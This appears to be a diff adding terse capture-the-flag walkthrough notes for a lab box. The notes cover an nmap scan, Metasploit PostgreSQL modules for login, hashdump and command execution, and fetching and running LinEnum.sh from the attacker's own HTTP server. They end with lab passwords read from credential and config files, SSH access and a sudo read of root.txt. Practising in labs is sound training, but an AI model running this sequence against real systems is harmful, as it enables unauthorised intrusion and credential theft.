@@ -1,0 +1,49 @@
+sudo nmap -p- -vv -sC -sV -A -O 10.10.12.70
+	we find a database postgresql PostgreSQL DB 9.5.8 - 9.5.10
+msfconsole
+	search postgre
+		first one i used was login
+		show options
+		remote hosts
+			run
+	search postgre
+		I then used postgres_sql
+		show options
+		remote hosts
+		set password
+			run
+	search postgre
+		hashdump
+		show options
+		remote hosts
+		set password
+			run
+	search postgre
+		read files
+		show options
+		set password
+		remote hosts
+			run
+	search postgre
+		cmd exec
+		show options
+		lhost
+		rhost
+		set password
+			run
+				we are in
+start python server
+	python -m SimpleHTTPServer 8000
+	wget Ipaddress/location
+	./LinEnum.sh
+	Find users
+Find password
+	cat /home/dark/credentials.txt
+		dark:qwerty1234#!hackme
+			ssh in 
+				cd ..
+					found alison but cannot access anything
+			cd /var/www/html
+				cat config.php
+					alison:p4ssw0rdS3cur3!#
+						sudo cat /root/root.txt
